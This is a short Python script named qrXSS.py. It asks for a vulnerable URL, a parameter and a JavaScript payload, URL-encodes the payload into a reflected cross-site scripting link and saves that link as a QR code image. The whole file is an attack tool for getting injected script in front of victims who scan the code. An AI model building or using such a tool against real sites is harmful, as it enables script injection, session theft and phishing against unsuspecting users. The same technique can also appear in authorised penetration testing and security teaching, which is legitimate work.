import pyqrcode
from urllib.parse import quote
# Requires pillow (pip install pillow)
print("+-------------------------------------+")
print("|          q r X S S . P Y            |")
print("| By: Sean McElhare (TheCrimsonCoder) |")
print("+-------------------------------------+")

def main():


    vulnURL = input("Enter the URL you would like to use:  ")
    vulnELEM = input("Enter the ELEMENT that is vulnerable: ")
    vulnSCRIPT = input("Enter the ACTION SCRIPT vulnerable (login.php etc): ")
    jsExploit  = input("Enter the JS you wish to encode: ")

    createQR(vulnURL, vulnELEM, vulnSCRIPT, encodeJS(jsExploit))

def encodeJS(jsExploit):

    jsExploit = quote(jsExploit)
    return jsExploit

def createQR(vulnURL, vulnELEM, vulnSCRIPT, encodedJS):

    qrURL = vulnURL + "/" + vulnSCRIPT + "?" + vulnELEM + "=" + encodedJS
    print("Generating QR Code for: " + qrURL)
    qrCode = pyqrcode.create(qrURL)
    qrCode.svg('qrxsscode.svg',scale=8)

main()




